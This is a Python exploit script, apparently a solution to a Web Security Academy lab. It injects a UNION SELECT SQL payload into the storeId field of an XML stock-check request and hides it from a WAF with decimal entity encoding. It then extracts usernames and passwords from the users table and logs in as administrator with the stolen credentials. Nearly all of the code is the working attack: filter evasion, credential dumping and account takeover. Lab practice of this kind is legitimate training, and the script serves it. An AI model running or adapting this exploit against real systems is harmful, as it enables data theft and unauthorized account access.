import urllib3
import requests
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

space         = " "
union         = "UNION"
select        = "SELECT"
from_         = "FROM"
null          = "NULL"
tilde         = "||'~'||"
table_name    = "users"
username      = "username"
password      = "password"
administrator = "administrator"


def check_wrong_login(text):
    soup = BeautifulSoup(text, "html.parser")
    error_tag = soup.find('p', class_="is-warning")
    if error_tag:
        error = error_tag.get_text().strip()
    else:
        error = None
    if error == "Invalid username or password.":
        return False
    return True


def csrf_getter(session, url):
    resp = session.get(url, verify=False)
    soup = BeautifulSoup(resp.text, "html.parser")
    token_input = soup.find("input", {"name": "csrf"})
    if not token_input or not token_input.get("value"):
        raise ValueError("Unable to find CSRF token on login page")
    return token_input["value"]


def cookie_getter(session, url):
    session.get(url, verify=False)
    resp = session.get(url + "/product?productId=1", verify=False)  
    session_tok = session.cookies.get('session')
    return session_tok


def dec_entities(payload):
    return ''.join(f'&#{ord(c)};' for c in payload)


def send_stock_request(session, url, session_tok, store_payload, product_id=1):
    headers = {
        "Content-Type" : "application/xml",
        "Cookie"       : f"session={session_tok}"
    }

    xml_body = f"""<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>{product_id}</productId>
    <storeId>{store_payload}</storeId>
</stockCheck>"""

    print(f'Trying storeId: {store_payload[:80]}...' if len(store_payload) > 80 else f'Trying storeId: {store_payload}')
    resp = session.post(url + "/product/stock", data=xml_body, headers=headers, verify=False)
    return resp


def vulnerability_checker(session, url, session_tok):
    resp = send_stock_request(session, url, session_tok, store_payload="1+1", product_id=1)
    print(f'    Response: {resp.text.strip()}')
    return resp.status_code == 200 and "units" in resp.text


def waf_bypass_checker(session, url, session_tok):
    raw_payload     = "1 UNION SELECT NULL"
    encoded_payload = dec_entities(raw_payload)

    resp_raw     = send_stock_request(session, url, session_tok, store_payload=raw_payload)
    resp_encoded = send_stock_request(session, url, session_tok, store_payload=encoded_payload)

    blocked  = resp_raw.status_code in (400, 403) or "attack" in resp_raw.text.lower()
    bypassed = resp_encoded.status_code == 200

    return blocked and bypassed


def extract_credentials(session, url, session_tok):
    sqli    = f"1 {union} {select} {username} {tilde} {password} {from_} {table_name}"
    payload = dec_entities(sqli)

    resp = send_stock_request(session, url, session_tok, store_payload=payload)
    print(f'    Response: {resp.text.strip()}')

    credentials = []
    for line in resp.text.strip().splitlines():
        line = line.strip()
        if '~' in line:
            user, pwd = line.split('~', 1)
            credentials.append((user.strip(), pwd.strip()))
            print(f'    [+] Found → {user.strip()} : {pwd.strip()}')

    return credentials


def main():
    url     = "https://0a25009f04a088c68078da3b00820000.web-security-academy.net"
    session = requests.Session()

    print("[*] Getting session cookie...")
    session_tok = cookie_getter(session, url)
    print(f"    session : {session_tok}")

    print("\n[*] Checking vulnerability (math evaluation)...")
    if not vulnerability_checker(session, url, session_tok):
        print("[!] Target does not appear vulnerable. Exiting.")
        exit(1)
    print("[+] Vulnerable!\n")

    print("[*] Checking WAF bypass...")
    if not waf_bypass_checker(session, url, session_tok):
        print("[!] WAF bypass failed. Exiting.")
        exit(1)
    print("[+] WAF bypassed via decimal entity encoding!\n")

    print("[*] Extracting credentials...")
    credentials = extract_credentials(session, url, session_tok)

    if not credentials:
        print("[!] No credentials found.")
        exit(1)

    admin_pwd = None
    for user, pwd in credentials:
        if user == administrator:
            admin_pwd = pwd
            break

    if not admin_pwd:
        print("[!] administrator not found in results.")
        exit(1)

    print(f"\n[✓] Password: {admin_pwd}")

    login_url = f'{url}/login'
    csrf      = csrf_getter(session, login_url)
    creds     = {"csrf": csrf, "username": administrator, "password": admin_pwd}
    r         = session.post(login_url, data=creds, verify=False)

    if check_wrong_login(r.text):
        print("Koated !!")
    else:
        print("ya siks")


if __name__ == "__main__":
    main()